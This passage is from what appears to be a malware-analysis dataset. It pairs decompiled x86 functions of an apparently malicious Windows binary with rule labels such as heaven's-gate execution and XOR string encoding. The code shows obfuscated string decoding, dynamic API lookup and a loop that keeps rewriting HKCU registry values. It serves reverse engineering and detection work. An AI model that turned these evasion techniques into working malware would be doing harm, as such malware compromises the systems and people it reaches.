= 0x6c;\n    var_24h._3_1_ = 0x6d;\n    var_20h._0_2_ = 0x7c66;\n    var_20h._2_1_ = 0x53;\n    stack0xffffffdf = 0x67696305;\n    var_1ch._3_1_ = 0x51;\n    var_8h = 0x58553761;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5153);\n    uVar6 = (*pcVar3)(8, 0x19);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar17 = 0;\n    var_44h = &var_30h - iVar16;\n    do {\n        puVar1 = iVar17 + iVar16;\n        iVar18 = iVar17 % var_48h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_8h + iVar18) ^ puVar1[&var_30h - iVar16];\n    } while (iVar17 < 0x18);\n    iVar18 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdd8, iVar16);\n    iVar17 = var_4ch;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar18 != 0) {\n        fcn.0040a800();\n    }\n    uVar6 = (*pcVar3)(0, iVar16);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar17);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_78h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_80h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar15);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_14h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_8ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_90h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar14);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar13);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar12);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar11);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar10);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_70h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar9);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, CONCAT13(var_50h._3_1_, var_50h));\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_68h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar8);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_6ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_88h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar7);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar20);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar5);\n    uVar19 = (*pcVar2)(uVar6);\n    return uVar19 & 0xffffff00;\n}\n",
        "token_count": 9425
    },
    "0040d4b4": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d4b4(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x36573b00;\n    var_14h = 0x592c0e58;\n    var_10h = 0x260f5c39;\n    var_ch._0_1_ = 0x36;\n    puVar6 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x55364963;\n    var_4h._0_1_ = 0x33;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    do {\n        var_1ch = 5;\n        puVar1 = iVar7 + iVar4;\n        iVar5 = iVar7 % 5;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_18h - iVar4];\n    } while (iVar7 < 0xd);\n    iVar7 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar2 = var_20h;\n    if (iVar7 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar7 = fcn.0040fc42();\n        if (iVar7 == -0x69b4c9f2) {\n            uVar2 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 576
    },
    "0040fc80": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040fc80(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040fcd5(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 186
    },
    "004014d4": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004014d4(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = 0x231f433b;\n    var_28h = 0x60465902;\n    var_24h = 0xa16233a;\n    var_20h._0_2_ = 0x4301;\n    var_20h._2_1_ = 0x48;\n    var_1ch = 0x4c483072;\n    var_18h._0_2_ = 0x6f75;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_8h = 6;\n    iVar8 = 0;\n    var_ch = &var_2ch - var_10h;\n    do {\n        puVar1 = iVar8 + var_10h;\n        iVar5 = iVar8 % 6;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_2ch - var_10h];\n    } while (iVar8 < 0xf);\n    var_2ch = 0x1f050b2c;\n    var_28h = 0x5c741629;\n    var_24h = 0x16201559;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x47);\n    var_1ch = 0x71776e47;\n    var_18h._0_2_ = 0x7a4c;\n    uVar4 = (*pcVar2)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = var_10h;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_8h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_2ch - iVar5];\n    } while (iVar7 < 0xd);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n    *0x41d1e8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    if (*0x41d1e8 != NULL) {\n        iVar7 = (**0x41d1e8)(var_14h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar3 = var_4h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar2)(uVar4);\n    return uVar3;\n}\n",
        "token_count": 898
    },
    "00401606": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __fastcall fcn.00401606(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *ARG_0;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_5ch._0_2_ = 0x5002;\n    var_5ch._2_1_ = 0x30;\n    iVar6 = 8;\n    puVar9 = &var_34h;\n    var_1ch = param_2;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    stack0xffffffa3 = 0x562a4528;\n    stack0xffffffa7 = 0x11440b21;\n    var_54h._3_1_ = 0x5c;\n    puVar9 = &var_4ch;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_50h = 0x45441d29;\n    var_24h = 0x78443545;\n    puVar9 = &var_44h;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_20h._0_1_ = 0x37;\n    puVar9 = &var_3ch;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4h = 5;\n    iVar5 = 0;\n    var_10h = &var_5ch - var_8h;\n    do {\n        puVar1 = iVar5 + var_8h;\n        iVar6 = iVar5 % 5;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_5ch - var_8h];\n    } while (iVar5 < 0x10);\n    var_5ch._0_2_ = 0xb2c;\n    var_5ch._2_1_ = 5;\n    stack0xffffffa3 = 0x7416291f;\n    stack0xffffffa7 = 0x2015595c;\n    var_54h._3_1_ = 0x16;\n    var_50h = var_50h & 0xffffff00 | 0x47;\n    var_2ch = 0x71776e47;\n    var_28h._0_2_ = 0x7a4c;\n    uVar3 = (*pcVar2)(8, 0xe);\n    var_24h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = var_8h;\n    iVar6 = 0;\n    ARG_0 = &var_5ch - var_24h;\n    do {\n        var_10h = 6;\n        puVar1 = iVar6 + var_24h;\n        iVar7 = iVar6 % 6;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_2ch + iVar7) ^ (&var_5ch - var_24h)[puVar1];\n    } while (iVar6 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_24h, var_8h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (pcVar4 != NULL) {\n        iVar6 = (*pcVar4)(var_18h, &var_34h, &var_4ch, &var_44h, &var_3ch);\n        if (iVar6 != 0) {\n            uVar3 = (*pcVar2)(8, 0x104);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapAlloc;\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_5ch._0_2_ = 0x1551;\n            var_5ch._2_1_ = 0x69;\n            stack0xffffffa3 = 0x94c0962;\n            stack0xffffffa7 = 0x4c096269;\n            var_54h._3_1_ = 9;\n            puVar8 = ARG_0;\n            for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_50h = CONCAT31(var_50h._1_3_, 0x44);\n            var_10h = 0x47447174;\n            var_ch._0_1_ = 0x39;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n            iVar5 = (*pcVar2)(uVar3);\n            puVar8 = ARG_0;\n            iVar6 = 0;\n            do {\n                puVar1 = iVar6 + iVar5;\n                iVar7 = iVar6 % var_4h;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_10h + iVar7) ^ puVar1[&var_5ch - iVar5];\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, iVar5, var_1ch, var_30h, var_34h);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            iVar5 = var_8h;\n            goto code_r0x004017e6;\n        }\n    }\n    puVar8 = NULL;\ncode_r0x004017e6:\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_24h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar8;\n}\n",
        "token_count": 1753
    },
    "00401a3a": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401a3a(uint param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = 0;\n    var_4h = 0;\n    var_ch = param_1;\n    if (*0x41cdd0 == NULL) {\n        var_24h = 0x1f050b2c;\n        var_20h = 0x5c741629;\n        var_1ch = 0x16201559;\n        var_18h._0_1_ = 0x47;\n        var_14h = 0x71776e47;\n        var_10h._0_2_ = 0x7a4c;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        do {\n            var_8h = 6;\n            puVar1 = iVar5 + iVar3;\n            iVar4 = iVar5 % 6;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_14h + iVar4) ^ puVar1[&var_24h - iVar3];\n        } while (iVar5 < 0xd);\n        iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar3);\n        if (iVar5 != 0) {\n            *0x41cdd0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, 0x410340);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        if (*0x41cdd0 == NULL) goto code_r0x00401b05;\n    }\n    iVar3 = (**0x41cdd0)(var_ch, &var_4h);\n    if (iVar3 == 0) {\n        var_4h = 0xffffffff;\n    }\ncode_r0x00401b05:\n    if (iVar5 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n    }\n    return var_4h;\n}\n",
        "token_count": 592
    },
    "00401e3a": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401e3a(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint var_170h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_68h = 0;\n    var_64h = 0x31512c1c;\n    var_60h = 0x52312e21;\n    puVar7 = &var_170h;\n    for (iVar3 = 0x104; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_5ch = 0x20261b19;\n    var_58h = 0x20252a45;\n    var_54h = 0x1194325;\n    var_50h = 0x2a532d26;\n    var_4ch = 0x741f3c21;\n    var_48h = 0x263d2430;\n    var_44h = 0x2a003159;\n    var_40h = 0x392c4431;\n    var_3ch = 0x2b7e1f21;\n    var_38h = 0x59312a22;\n    var_34h = 0x106f2220;\n    var_30h = 0x26223152;\n    var_2ch = 0xa36502d;\n    var_28h = 0x20592c15;\n    var_24h = 0x53661325;\n    var_20h._0_2_ = 0x5619;\n    var_ch = 0x4537434f;\n    var_8h._0_1_ = 0x56;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    var_6ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar3 = 0;\n    do {\n        puVar1 = iVar3 + var_6ch;\n        iVar4 = iVar3 % 5;\n        iVar3 = iVar3 + 1;\n        *puVar1 = *(&var_ch + iVar4) ^ puVar1[&var_64h - var_6ch];\n    } while (iVar3 < 0x46);\n    var_14h = 0x7f545c54;\n    var_10h._0_1_ = 0x4a;\n    var_1ch = 0x4f646966;\n    var_18h._0_2_ = 0x6a4a;\n    var_ch = 6;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = var_6ch;\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + iVar4;\n        iVar5 = iVar6 % var_ch;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_14h - iVar4];\n    } while (iVar6 < 5);\n    do {\n        iVar6 = 0;\n        do {\n            var_4h = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_170h, iVar3, iVar6);\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_170h, &var_4h);\n            if (iVar5 == 0) {\n                var_68h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_4h, iVar4, 0, 4, &var_68h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1173
    },
    "00402ceb": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402ceb(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar var_2h;\n    uchar var_1h;\n    \n    var_18h._0_1_ = 0x3a;\n    var_18h._1_1_ = 0x26;\n    var_18h._2_1_ = 0x19;\n    var_18h._3_1_ = 0x18;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x37;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x3a;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0;\n    var_8h._0_1_ = 0x35;\n    var_8h._1_1_ = 0x33;\n    var_38h = 6;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x30;\n    var_4h = 0xe;\n    var_3h = 0x26;\n    var_2h = 0x5a;\n    var_a8h = 0x6a5a4369;\n    var_a4h._0_1_ = 0x55;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_34h = 5;\n    iVar24 = 0;\n    do {\n        puVar1 = iVar24 + iVar5;\n        iVar6 = iVar24 % 5;\n        iVar24 = iVar24 + 1;\n        *puVar1 = *(&var_a8h + iVar6) ^ puVar1[&var_18h - iVar5];\n    } while (iVar24 < 0x17);\n    fcn.00407d6f();\n    var_18h._0_1_ = 6;\n    var_20h = 0x250f0d60;\n    var_1ch._0_1_ = 0x3c;\n    var_1ch._1_1_ = 0x5a;\n    var_1ch._2_1_ = 0xf;\n    var_1ch._3_1_ = 0x20;\n    var_18h._1_1_ = 0x3d;\n    var_18h._2_1_ = 0x5a;\n    var_18h._3_1_ = 5;\n    var_14h._0_1_ = 0x2f;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x67;\n    var_10h._0_1_ = 7;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x33;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 99;\n    var_ch._1_1_ = 0x1a;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x20;\n    var_8h._0_1_ = 0x26;\n    var_8h._1_1_ = 0x5f;\n    var_8h._2_1_ = 0xd;\n    var_8h._3_1_ = 0x29;\n    var_4h = 0x33;\n    var_3h = 0x4f;\n    var_a0h = 0x564e6833;\n    var_9ch._0_1_ = 0x4f;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    var_a8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar24 = 0;\n    do {\n        puVar1 = iVar24 + var_a8h;\n        iVar6 = iVar24 % var_34h;\n        iVar24 = iVar24 + 1;\n        *puVar1 = *(&var_a0h + iVar6) ^ puVar1[&var_20h - var_a8h];\n    } while (iVar24 < 0x1e);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0x1d;\n    var_18h._1_1_ = 9;\n    var_18h._2_1_ = 0x7b;\n    var_18h._3_1_ = 0x38;\n    var_14h._0_1_ = 0x28;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 9;\n    var_10h._0_1_ = 0x5a;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 0x39;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x1e;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0x5e;\n    var_ch._3_1_ = 0x21;\n    var_8h._0_1_ = 0x22;\n    var_8h._1_1_ = 0x3b;\n    var_8h._2_1_ = 0x2b;\n    var_8h._3_1_ = 0xb;\n    var_4h = 0x52;\n    var_3h = 0x57;\n    var_28h = 0x57376c4e;\n    var_24h._0_2_ = 0x574b;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    var_a0h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar24 = 0;\n    do {\n        puVar1 = iVar24 + var_a0h;\n        iVar6 = iVar24 % var_38h;\n        iVar24 = iVar24 + 1;\n        *puVar1 = *(&var_28h + iVar6) ^ puVar1[&var_18h - var_a0h];\n    } while (iVar24 < 0x16);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x1f;\n    var_1ch._1_1_ = 6;\n    var_1ch._2_1_ = 10;\n    var_1ch._3_1_ = 0x5e;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x3e;\n    var_18h._3_1_ = 0x22;\n    var_14h._0_1_ = 0x43;\n    var_14h._1_1_ = 0x3f;\n    var_14h._2_1_ = 0x1d;\n    var_14h._3_1_ = 0x16;\n    var_10h._0_1_ = 0x2c;\n    var_10h._1_1_ = 0x44;\n    var_10h._2_1_ = 0x3b;\n    var_10h._3_1_ = 0x1c;\n    var_ch._0_1_ = 0x11;\n    var_ch._1_1_ = 0x2a;\n    var_ch._2_1_ = 0x46;\n    var_ch._3_1_ = 0x33;\n    var_8h._0_1_ = 0x20;\n    var_8h._2_1_ = 0x24;\n    var_8h._3_1_ = 0x55;\n    var_4h = 0x5a;\n    var_98h = 0x3043634c;\n    var_94h._0_1_ = 0x5a;\n    var_18h._2_1_ = var_1ch._1_1_;\n    var_8h._1_1_ = var_1ch._1_1_;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar24 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + iVar24;\n        iVar7 = iVar6 % var_34h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_98h + iVar7) ^ puVar1[&var_1ch - iVar24];\n    } while (iVar6 < 0x19);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x17;\n    var_1ch._1_1_ = 8;\n    var_1ch._2_1_ = 0x32;\n    var_1ch._3_1_ = 0x26;\n    var_18h._0_1_ = 0x1f;\n    var_18h._1_1_ = 0x2b;\n    var_18h._2_1_ = 1;\n    var_18h._3_1_ = 0xe;\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 5;\n    var_14h._2_1_ = 0x30;\n    var_14h._3_1_ = 8;\n    var_10h._0_1_ = 3;\n    var_10h._1_1_ = 1;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x34;\n    var_ch._0_1_ = 0x18;\n    var_ch._1_1_ = 0x13;\n    var_ch._2_1_ = 0x18;\n    var_ch._3_1_ = 0x1e;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 0x1b;\n    var_8h._2_1_ = 0xe;\n    var_8h._3_1_ = 0x24;\n    var_4h = 9;\n    var_3h = 0x23;\n    var_2h = 8;\n    var_1h = 0x67;\n    var_78h = 0x48676d44;\n    var_74h._0_1_ = 0x6c;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    var_98h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + var_98h;\n        iVar7 = iVar6 % var_34h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_78h + iVar7) ^ puVar1[&var_1ch - var_98h];\n    } while (iVar6 < 0x1c);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x10;\n    var_1ch._1_1_ = 0x13;\n    var_1ch._2_1_ = 2;\n    var_1ch._3_1_ = 0x14;\n    var_18h._0_1_ = 